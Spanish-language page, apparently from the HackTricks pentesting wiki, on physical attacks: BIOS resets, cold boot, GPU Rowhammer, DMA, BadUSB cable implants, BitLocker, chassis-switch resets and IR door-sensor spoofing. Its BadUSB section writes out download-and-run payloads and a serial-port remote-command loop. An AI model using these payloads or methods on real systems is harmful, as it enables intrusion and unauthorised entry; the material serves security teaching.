# Ataques físicos

{{#include ../banners/hacktricks-training.md}}

## Recuperación de contraseñas de BIOS y seguridad del sistema

La configuración del firmware de PC antiguos puede restablecerse desconectando la batería CMOS o usando un jumper documentado para borrar la CMOS. El tiempo de apagado necesario depende de la placa, y las contraseñas o claves de UEFI modernas pueden almacenarse en memoria flash no volátil, un controlador integrado o un dispositivo de seguridad, por lo que podrían persistir tras retirar la batería. Consulta el manual de servicio o de la placa antes de hacer un cortocircuito entre los pines; este procedimiento también puede invalidar las mediciones del TPM y activar la recuperación del cifrado del disco.

En sistemas x86 antiguos, herramientas como **killCMOS** y **CmosPwd** pueden inspeccionar o modificar la configuración almacenada en la CMOS desde un entorno de arranque. CmosPwd reconoce formatos de contraseña de un conjunto documentado de familias antiguas de BIOS y puede hacer copias de seguridad, restaurar o borrar/eliminar el estado de la CMOS; sus compilaciones publicadas están dirigidas a entornos antiguos de DOS/Windows, Linux, FreeBSD y NetBSD.<sup>[[18]](#references)</sup> Estas utilidades no son herramientas genéricas para eliminar contraseñas de UEFI y requieren acceso suficiente al hardware/firmware.

Algunos firmwares de portátiles muestran un código de desafío específico del fabricante tras varios intentos fallidos de contraseña. Bases de datos como [bios-pw.org](https://bios-pw.org) pueden generar contraseñas de recuperación antiguas para algunos modelos, pero muchos sistemas implementan un bloqueo sin un desafío del que se pueda derivar una contraseña. Trata las contraseñas generadas como específicas del modelo y evita agotar los contadores de intentos permanentes.

### Seguridad de UEFI

En sistemas **UEFI** modernos, CHIPSEC puede auditar las protecciones de las variables de Secure Boot. Empieza con la comprobación que no modifica nada que se muestra a continuación; el modo opcional `-a modify` intenta deliberadamente corromper las variables y solo debe usarse en un sistema de laboratorio que pueda recuperarse. El propio CHIPSEC advierte que su controlador con privilegios y el acceso al hardware de bajo nivel no son adecuados para endpoints de producción.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Análisis de RAM y ataques de cold boot

La DRAM no pierde todos sus bits inmediatamente cuando se detiene la actualización. La tasa de degradación varía considerablemente según la tecnología del módulo y la temperatura; el enfriamiento puede conservar datos útiles mucho más tiempo que un ciclo de apagado y encendido sin enfriar. Un ataque de cold boot reinicia rápidamente el sistema en un entorno de adquisición pequeño o traslada un módulo enfriado, captura la memoria sin procesar y reconstruye claves criptográficas pese a la degradación de bits. Una utilidad para copiar discos no es automáticamente una herramienta de adquisición de memoria física, y Volatility analiza una captura, pero no la adquiere; usa una herramienta de adquisición validada y adecuada para la plataforma.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer contra tablas de páginas

Los ataques modernos de GPU Rowhammer son mucho más útiles cuando apuntan a **metadatos de memoria virtual de la GPU** en lugar de a búferes ordinarios. Trabajos recientes sobre **GPU NVIDIA Ampere con GDDR6** muestran que un atacante que ejecute código CUDA sin privilegios puede crear patrones de hammering específicos para GPU, usar **memory massaging** para colocar estructuras de paginación en filas vulnerables y luego voltear bits en la **tabla de páginas de último nivel** o en un **directorio de páginas** intermedio. Una vez que se corrompe una sola entrada de traducción, el atacante puede obtener **lectura/escritura arbitraria de memoria de la GPU** y luego pivotar hacia el compromiso del host.<sup>[[1]](#references)[[2]](#references)</sup>

### Patrón de explotación

1. **Perfilar las filas susceptibles de hammering** en GDDR6 y crear patrones de hammering que tengan en cuenta la actualización y no sean uniformes para evadir las mitigaciones internas de DRAM.
2. **Manipular las asignaciones de GPU** para que el controlador coloque estructuras de traducción de páginas en ubicaciones físicas susceptibles de hammering, en lugar de mantenerlas en el pool protegido predeterminado. En la práctica, esto puede implicar agotar la región de memoria baja de las tablas de páginas y dispersar asignaciones UVM grandes y dispersas con pasos controlados.
3. **Voltear metadatos de traducción**, como bits **PFN** o relacionados con el aperture, dentro de una entrada de tabla de páginas o directorio de páginas, de modo que la página virtual controlada por el atacante se resuelva en páginas de tablas de páginas, memoria arbitraria de la GPU o asignaciones del sistema visibles para el host.
4. Reutilizar la asignación falsificada para reescribir entradas de traducción adicionales y escalar hasta obtener **lectura/escritura arbitraria de memoria de la GPU** en distintos contextos de GPU.

### Pivot al host y mitigaciones

- Con la **IOMMU deshabilitada**, las asignaciones falsificadas del aperture del sistema pueden exponer memoria física **arbitraria del host** a la GPU, convirtiendo la primitiva de la GPU en un compromiso total del host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** apunta a entradas de la tabla de páginas de último nivel, mientras que **GeForge** muestra que puede ser más fácil corromper un nivel del directorio de páginas, ya que un solo bit volteado puede redirigir un subárbol de traducción más grande. No consideres que solo una capa de paginación es crítica para la seguridad.<sup>[[1]](#references)[[2]](#references)</sup>
- La **IOMMU** sigue siendo importante porque bloquea la ruta directa a memoria arbitraria del host que usan GDDRHammer/GeForge, pero **no es una mitigación completa**. **GPUBreach** muestra un pivot de segunda etapa en el que el atacante corrompe búferes de CPU modificables por la GPU y propiedad del controlador, y luego provoca errores de seguridad de memoria en el controlador NVIDIA para obtener una primitiva de escritura en el kernel y un **root shell**, incluso con la IOMMU habilitada.<sup>[[3]](#references)</sup>
- La **ECC a nivel de sistema** es una medida práctica de protección reforzada en GPU compatibles para estaciones de trabajo y servidores. Las GPU de consumo sin ECC ofrecen una superficie de defensa más débil.<sup>[[4]](#references)</sup>
- Estos ataques no son puramente teóricos: **GeForge** informó **1,171** flips de bits en una RTX 3060 y **202** en una RTX A6000, suficientes para construir una cadena funcional de escalada de privilegios en el host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Ataques de acceso directo a memoria (DMA)

Para ver cómo la modificación offline de UEFI IFR/NVRAM puede rebajar la aplicación de IOMMU antes del arranque y habilitar una cadena de ataque DMA en Windows, consulta:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demuestra la adquisición y modificación de memoria mediante **DMA** a través de interfaces como FireWire y las primeras configuraciones de Thunderbolt, e incluye firmas históricas de omisión de inicio de sesión. No es simplemente «ineficaz contra Windows 10»: la posibilidad de explotación depende de la interfaz, la compilación de destino, la política de IOMMU, el estado de bloqueo y de si Windows Kernel DMA Protection es compatible y está habilitada. Windows 10 versión 1803 y posteriores introdujeron Kernel DMA Protection en plataformas compatibles, lo que cambió considerablemente la superficie de ataque.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB para acceder al sistema

En un volumen de Windows sin cifrar o ya desbloqueado, un entorno offline puede reemplazar binarios de accesibilidad como **sethc.exe** o **Utilman.exe** por **cmd.exe**, lo que permite obtener un símbolo del sistema de SYSTEM cuando se ejecuta el acceso directo correspondiente en la pantalla de inicio de sesión. Herramientas como **chntpw** pueden editar los datos de cuentas locales de SAM. Estos métodos no omiten un volumen BitLocker bloqueado y pueden dañar credenciales protegidas con DPAPI/EFS; conserva copias forenses y copias de seguridad.

**Kon-Boot** es una herramienta comercial de omisión de autenticación durante el arranque para configuraciones compatibles de Windows/macOS. La compatibilidad depende del sistema operativo, el modo de firmware, Secure Boot y la configuración del cifrado de disco; no descifra un volumen BitLocker bloqueado.<sup>[[10]](#references)</sup>

---

## Gestión de las funciones de seguridad de Windows

### Accesos directos de arranque y recuperación

- **Delete/Supr**, F2, F10 u otra tecla del fabricante pueden abrir la configuración del firmware.
- **F8** accede a las opciones de arranque avanzadas del Windows heredado solo en configuraciones donde esa ruta siga habilitada; el acceso a la recuperación actual varía.
- Mantener pulsada **Shift** puede impedir el inicio de sesión automático de Windows en algunas configuraciones, aunque los ajustes de directiva o del registro pueden deshabilitar ese comportamiento.<sup>[[17]](#references)</sup>

### Dispositivos BAD USB

Dispositivos como **USB Rubber Ducky** y las placas Teensy pueden enumerarse como teclados HID de confianza e inyectar pulsaciones predefinidas. El payload obtiene inicialmente los privilegios y el acceso al escritorio de la sesión iniciada; las solicitudes de UAC, el bloqueo de pantalla, la distribución del teclado, los tiempos y la política USB de los endpoints siguen limitándolo.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Los privilegios de administrador o de copia de seguridad permiten crear una copia sombra o guardar las colmenas del registro para adquirir archivos bloqueados como **SAM** y **SYSTEM**. Esta es una técnica de recopilación posterior al compromiso, no una forma de omitir privilegios; debe correlacionarse con eventos de `diskshadow`/VSS y de exportación de colmenas del registro.

## Técnicas de implantes BadUSB / HID

### Implantes Wi-Fi en cables gestionados

- Los implantes basados en ESP32-S3, como **Evil Crow Cable Wind**, se ocultan dentro de cables USB-A→USB-C o USB-C↔USB-C, se enumeran únicamente como teclados USB y exponen su stack C2 por Wi-Fi. El operador solo necesita alimentar el cable desde el equipo de la víctima, crear un hotspot llamado `Evil Crow Cable Wind` con la contraseña `123456789` y visitar [http://cable-wind.local/](http://cable-wind.local/) (o su dirección DHCP) para acceder a la interfaz HTTP integrada.<sup>[[8]](#references)</sup>
- La interfaz del navegador ofrece pestañas para *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* y *Config*. Los payloads almacenados se etiquetan según el sistema operativo, las distribuciones del teclado se cambian sobre la marcha y las cadenas VID/PID se pueden modificar para imitar periféricos conocidos.
- Como el C2 está dentro del cable, un teléfono puede preparar payloads, iniciar su ejecución y gestionar las credenciales Wi-Fi sin usar la red de la organización, algo útil en intrusiones físicas de corta duración.

### Payloads AutoExec que detectan el sistema operativo

- Las reglas AutoExec asocian uno o más payloads para que se ejecuten inmediatamente después de la enumeración USB. El implante realiza una identificación ligera del sistema operativo y selecciona el script correspondiente.
- Flujo de trabajo de ejemplo:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) o `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Como la ejecución no requiere intervención, basta con cambiar un cable de carga para obtener acceso inicial «plug-and-pwn» en el contexto del usuario con sesión iniciada.

### Shell remota iniciada por HID sobre Wi-Fi TCP

1. **Inicio mediante pulsaciones:** un payload almacenado abre una consola y pega un bucle que ejecuta lo que llegue por el nuevo dispositivo serie USB. Una variante mínima para Windows es:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Puente de cable:** El implante mantiene abierto el canal USB CDC mientras su ESP32-S3 inicia un cliente TCP (script de Python, APK de Android o ejecutable de escritorio) que se conecta de vuelta al operador. Cualquier byte escrito en la sesión TCP se reenvía al bucle serie anterior, lo que permite la ejecución remota de comandos incluso en hosts aislados de la red. La salida es limitada, por lo que los operadores suelen ejecutar comandos a ciegas (crear cuentas, preparar herramientas adicionales, etc.).

### Superficie de actualización OTA por HTTP

- La interfaz documentada de Evil Crow Cable Wind expone un endpoint de actualización de firmware sin autenticación en `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Los operadores de campo pueden cambiar funciones en caliente (p. ej., instalar firmware de USB Army Knife) durante una operación sin abrir el cable, lo que permite que el implante cambie a nuevas capacidades mientras sigue conectado al host objetivo.

## Evadir el cifrado de BitLocker

Una adquisición forense autorizada de un sistema activo o que se haya ejecutado recientemente puede contener una clave maestra de volumen de BitLocker u otro material de claves relacionado mientras el volumen está desbloqueado. Herramientas comerciales como Elcomsoft Forensic Disk Decryptor y Passware Kit Forensic pueden buscar en imágenes de memoria, archivos de hibernación o volcados de memoria compatibles, pero el éxito no está garantizado. Las versiones modernas de Windows también cifran los volcados de memoria cuando BitLocker está habilitado, y una contraseña de recuperación de 48 dígitos almacenada es un artefacto distinto de una clave de volumen presente en la memoria.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Ingeniería social para añadir una clave de recuperación

Un atacante que convenza a un administrador para que ejecute comandos de administración de BitLocker puede añadir un protector de contraseña de recuperación, clave externa u otro tipo, y luego capturarlo. Una contraseña de recuperación no puede ser una cadena arbitraria de ceros: las contraseñas numéricas de recuperación de BitLocker tienen un formato validado de 48 dígitos. La sintaxis pertinente para la administración autorizada es `manage-bde -protectors -add C: -recoverypassword`; enumere los protectores resultantes con `manage-bde -protectors -get C:`. Supervise las adiciones de protectores y asegúrese de que el nuevo material de recuperación se almacene únicamente en ubicaciones aprobadas.<sup>[[16]](#references)</sup>

---

## Explotar los interruptores de intrusión en el chasis / mantenimiento para restablecer el BIOS de fábrica

Muchos portátiles modernos y equipos de escritorio de formato pequeño incluyen un **interruptor de intrusión en el chasis** supervisado por el Embedded Controller (EC) y el firmware del BIOS/UEFI. Aunque el propósito principal del interruptor es generar una alerta cuando se abre un dispositivo, algunos fabricantes implementan un **atajo de recuperación no documentado** que se activa al accionar el interruptor siguiendo un patrón específico.<sup>[[5]](#references)[[6]](#references)</sup>

### Cómo funciona el ataque

1. El interruptor está conectado a una **interrupción GPIO** del EC.
2. El firmware que se ejecuta en el EC lleva un registro del **momento y la cantidad de pulsaciones**.
3. Cuando se reconoce un patrón codificado, el EC ejecuta una rutina de *restablecimiento de la placa base* que **borra el contenido de la NVRAM/CMOS del sistema**.
4. En el siguiente arranque, los modelos afectados cargan el estado de firmware restablecido. Según el fabricante y la revisión, el estado borrado puede incluir una contraseña de supervisor, ajustes de arranque personalizados o claves de Secure Boot inscritas; el estado del TPM y los efectos sobre el cifrado del disco deben evaluarse por separado.

> Un restablecimiento del firmware puede restaurar las opciones de arranque externo, pero **no** descifra el almacenamiento. BitLocker u otro sistema de cifrado de disco completo puede entrar en modo de recuperación tras cambios en el TPM o el firmware y seguir protegiendo la unidad interna si no se dispone de una clave de recuperación.<sup>[[16]](#references)</sup>

### Ejemplo real – portátil Framework 13

El atajo de recuperación para Framework 13 (de 11.ª/12.ª/13.ª generación) es:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Después del décimo ciclo, el EC establece una marca que indica al BIOS que borre la NVRAM en el siguiente reinicio. Todo el procedimiento tarda ~40 s y requiere **nada más que un destornillador**.<sup>[[5]](#references)</sup>

### Procedimiento genérico de explotación

1. Enciende o suspende y reanuda el objetivo para que el EC esté en ejecución.
2. Retira la cubierta inferior para dejar al descubierto el interruptor de intrusión/mantenimiento.
3. Reproduce el patrón de alternancia específico del proveedor (consulta la documentación o los foros, o aplica ingeniería inversa al firmware del EC).
4. Vuelve a montar el equipo y reinícialo; luego inspecciona qué ajustes del firmware y credenciales cambiaron realmente.
5. Si está autorizado y es posible arrancar desde un medio externo, inicia una imagen live controlada. Una vez que se desbloquee legítimamente un volumen interno (o si nunca estuvo cifrado), el entorno live puede obtener credenciales y datos, o inspeccionar la EFI System Partition. Modificar esa partición para instalar un implante EFI es persistente y altamente intrusivo, y sigue estando limitado por Secure Boot, el arranque medido, la protección contra escritura del firmware y la supervisión de endpoints. El almacenamiento cifrado sigue siendo inaccesible sin la clave o el material de recuperación.

### Detección y mitigación

* Registra los eventos de intrusión del chasis en la consola de administración del sistema operativo y correlaciónalos con restablecimientos inesperados del BIOS.
* Usa **sellos a prueba de manipulaciones** en los tornillos y las cubiertas para detectar aperturas.
* Mantén los dispositivos en **áreas con control físico**; considera que el acceso físico equivale a un compromiso total.
* Cuando esté disponible, desactiva la función del proveedor «restablecimiento mediante interruptor de mantenimiento» o exige una autorización criptográfica adicional para restablecer la NVRAM.

---

## Inyección IR encubierta contra sensores de salida sin contacto

### Características del sensor
- Los sensores comerciales de «wave-to-exit» combinan un emisor LED de infrarrojo cercano con un módulo receptor similar al de un control remoto de TV, que solo indica nivel lógico alto tras detectar varios pulsos (~4–10) de la portadora correcta (≈30 kHz).<sup>[[7]](#references)</sup>
- Una cubierta de plástico impide que el emisor y el receptor se apunten directamente, por lo que el controlador supone que toda portadora validada proviene de un reflejo cercano y activa un relé que abre el pestillo de la puerta.
- Una vez que el controlador detecta un objetivo, suele cambiar la envolvente de modulación de salida, pero el receptor sigue aceptando cualquier ráfaga que coincida con la portadora filtrada.

### Flujo del ataque
1. **Captura el perfil de emisión** – conecta un analizador lógico a los pines del controlador para registrar las formas de onda previas y posteriores a la detección que activan el LED IR interno.
2. **Reproduce solo la forma de onda «posterior a la detección»** – retira o ignora el emisor original y activa un LED IR externo con el patrón ya activado desde el principio. Como al receptor solo le importan el número de pulsos y la frecuencia, interpreta la portadora falsificada como un reflejo real y activa la línea del relé.
3. **Controla la transmisión** – transmite la portadora en ráfagas ajustadas (p. ej., decenas de milisegundos encendida y un intervalo apagada similar) para entregar el número mínimo de pulsos sin saturar el AGC del receptor ni activar la lógica de gestión de interferencias. La emisión continua desensibiliza rápidamente el sensor e impide que se active el relé.

### Inyección reflectante de largo alcance
- Sustituir el LED de pruebas por un diodo IR de alta potencia, un controlador MOSFET y óptica de enfoque permite activarlo de forma fiable desde ~6 m.
- El atacante no necesita tener línea de visión directa a la apertura del receptor; al apuntar el haz a paredes interiores, estanterías o marcos de puerta visibles a través del cristal, la energía reflejada puede entrar en el campo de visión de ~30° e imitar el movimiento de una mano a corta distancia.
- Como los receptores esperan únicamente reflejos débiles, un haz externo mucho más potente puede rebotar en varias superficies y aun así superar el umbral de detección.

### Linterna de ataque armada
- Integrar el controlador en una linterna comercial oculta la herramienta a plena vista. Sustituye el LED visible por uno IR de alta potencia que coincida con la banda del receptor, añade un ATtiny412 (o similar) para generar las ráfagas de ≈30 kHz y usa un MOSFET para conducir la corriente del LED.
- Una lente telescópica con zoom estrecha el haz para aumentar el alcance y la precisión, mientras que un motor de vibración controlado por MCU proporciona confirmación háptica de que la modulación está activa, sin emitir luz visible.
- Alternar entre varios patrones de modulación almacenados (con frecuencias de portadora y envolventes ligeramente distintas) aumenta la compatibilidad con familias de sensores comercializadas bajo distintas marcas y permite al operador recorrer las superficies reflectantes hasta que el relé haga clic y la puerta se abra.

---

## References

- [1] [GDDRHammer: Perturbación considerable de filas DRAM: ataques Rowhammer entre componentes desde GPU modernas](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Manipulación de memoria GDDR para falsificar tablas de páginas de GPU por diversión y beneficio](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Ataques de escalada de privilegios en GPU mediante Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Aviso de seguridad: Rowhammer - julio de 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – «Framework 13. Pulsa aquí para tomar el control»](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Guía para restablecer la placa base](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – «¡Noooooo toques! – Cómo eludir sensores IR de salida sin contacto con una linterna IR encubierta»](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – «Conecta, ejecuta y toma el control: hacking con Evil Crow Cable Wind»](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Ataque Rowhammer contra chips NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Documentación oficial de Kon-Boot e información de compatibilidad](https://kon-boot.com/)
- [11] [Documentación de CHIPSEC - Protecciones de variables de Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Para que no olvidemos: ataques de arranque en frío contra claves de cifrado](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipulación de memoria física mediante DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Protección DMA del kernel](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Documentación de Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Guía de operaciones de BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Mantener pulsada la tecla Shift y el comportamiento del inicio de sesión automático](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Documentación y descargas de CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
